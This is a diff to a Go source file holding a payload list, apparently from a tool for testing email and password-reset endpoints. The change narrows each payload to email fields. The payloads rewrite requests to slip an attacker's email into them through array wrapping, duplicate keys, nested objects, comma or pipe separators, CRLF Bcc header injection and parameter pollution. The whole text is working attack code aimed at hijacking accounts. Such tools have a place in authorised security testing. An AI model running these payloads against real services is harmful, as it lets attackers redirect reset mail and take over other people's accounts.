@@ -222,16 +222,22 @@ var Payloads = []Payload{
 	{
 		Name:        "Array injection",
 		Mode:        "body",
-		Description: "wrap field values in array with attacker value appended",
+		Description: "wrap email fields in array with attacker value appended",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				modified[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
 			}
 			return PreviewBodyFields(r.Fields, modified)
 		},
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				r.Fields[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
 			}
 			newBody := RebuildBody(r)
@@ -243,11 +249,14 @@ var Payloads = []Payload{
 	{
 		Name:        "Mixed array",
 		Mode:        "body",
-		Description: "first field becomes array with attacker value, rest stay as strings",
+		Description: "first email field becomes array with attacker value, rest stay as strings",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			modified := DeepCopyFields(r.Fields)
 			first := true
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				if first {
 					modified[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
 					first = false
@@ -258,6 +267,9 @@ var Payloads = []Payload{
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
 			first := true
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				if first {
 					r.Fields[k] = []any{v, InjectValue(k, attackerEmail, attackerDomain)}
 					first = false
@@ -335,7 +347,7 @@ var Payloads = []Payload{
 	{
 		Name:        "Duplicate keys",
 		Mode:        "body",
-		Description: "repeat each field key with attacker value second — parser picks last or first",
+		Description: "repeat each email field key with attacker value second — parser picks last or first",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			var lines []string
 			arrow := "\033[33m→\033[0m"
@@ -343,9 +355,15 @@ var Payloads = []Payload{
 			reset := "\033[0m"
 			bold := "\033[1m"
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				evil := InjectValue(k, attackerEmail, attackerDomain)
 				lines = append(lines, fmt.Sprintf("  %s~%s %s%s%s: %s  %s  %s, %s (duplicate key)",
 					bold, reset, dim, k, reset, anyToString(v), arrow, anyToString(v), evil))
+			}
+			if len(lines) == 0 {
+				return "  (no email fields found to duplicate)"
 			}
 			return strings.Join(lines, "\n")
 		},
@@ -354,8 +372,12 @@ var Payloads = []Payload{
 			// use anyToString to safely convert any field value type (avoids panic)
 			raw := "{"
 			for k, v := range r.Fields {
-				raw += `"` + k + `":"` + fmt.Sprintf("%v", v) + `",`
-				raw += `"` + k + `":"` + InjectValue(k, attackerEmail, attackerDomain) + `",`
+				if isEmailField(k) {
+					raw += `"` + k + `":"` + fmt.Sprintf("%v", v) + `",`
+					raw += `"` + k + `":"` + InjectValue(k, attackerEmail, attackerDomain) + `",`
+				} else {
+					raw += `"` + k + `":"` + fmt.Sprintf("%v", v) + `",`
+				}
 			}
 			raw = raw[:len(raw)-1] + "}"
 			UpdateContentLength(&r, raw)
@@ -410,16 +432,22 @@ var Payloads = []Payload{
 	{
 		Name:        "Nested object",
 		Mode:        "body",
-		Description: "wrap field values in nested object — tests alternative parsing paths",
+		Description: "wrap email field values in nested object — tests alternative parsing paths",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				modified[k] = map[string]any{"value": v, "email": InjectValue(k, attackerEmail, attackerDomain)}
 			}
 			return PreviewBodyFields(r.Fields, modified)
 		},
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				r.Fields[k] = map[string]any{"value": v, "email": InjectValue(k, attackerEmail, attackerDomain)}
 			}
 			newBody := RebuildBody(r)
@@ -431,16 +459,22 @@ var Payloads = []Payload{
 	{
 		Name:        "Comma separated",
 		Mode:        "body",
-		Description: "append attacker value comma-separated in field string",
+		Description: "append attacker email comma-separated in email field string",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				modified[k] = anyToString(v) + "," + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			return PreviewBodyFields(r.Fields, modified)
 		},
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				r.Fields[k] = fmt.Sprintf("%v", v) + "," + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			newBody := RebuildBody(r)
@@ -452,16 +486,22 @@ var Payloads = []Payload{
 	{
 		Name:        "Pipe separated",
 		Mode:        "body",
-		Description: "append attacker value pipe-separated in field string",
+		Description: "append attacker email pipe-separated in email field string",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				modified[k] = anyToString(v) + "|" + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			return PreviewBodyFields(r.Fields, modified)
 		},
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				r.Fields[k] = fmt.Sprintf("%v", v) + "|" + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			newBody := RebuildBody(r)
@@ -473,16 +513,22 @@ var Payloads = []Payload{
 	{
 		Name:        "CRLF injection",
 		Mode:        "body",
-		Description: "inject CRLF + Bcc header into field value for email header injection",
+		Description: "inject CRLF + Bcc header into email field value for email header injection",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				modified[k] = anyToString(v) + "%0aBcc:" + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			return PreviewBodyFields(r.Fields, modified)
 		},
 		Apply: func(r ParsedRequest, attackerDomain, attackerEmail string) ParsedRequest {
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				r.Fields[k] = fmt.Sprintf("%v", v) + "%0aBcc:" + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			newBody := RebuildBody(r)
@@ -528,13 +574,16 @@ var Payloads = []Payload{
 	{
 		Name:        "Parameter pollution form",
 		Mode:        "body",
-		Description: "duplicate all params with attacker value second (form-encoded only)",
+		Description: "duplicate email params with attacker value second (form-encoded only)",
 		Preview: func(r ParsedRequest, attackerDomain, attackerEmail string) string {
 			if r.BodyType != "form" {
 				return "  (skipped — not a form-encoded request)"
 			}
 			modified := DeepCopyFields(r.Fields)
 			for k, v := range modified {
+				if !isEmailField(k) {
+					continue
+				}
 				modified[k] = anyToString(v) + "&" + k + "=" + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			return PreviewBodyFields(r.Fields, modified)
@@ -544,6 +593,9 @@ var Payloads = []Payload{
 				return r
 			}
 			for k, v := range r.Fields {
+				if !isEmailField(k) {
+					continue
+				}
 				r.Fields[k] = fmt.Sprintf("%v", v) + "&" + k + "=" + InjectValue(k, attackerEmail, attackerDomain)
 			}
 			newBody := RebuildBody(r)
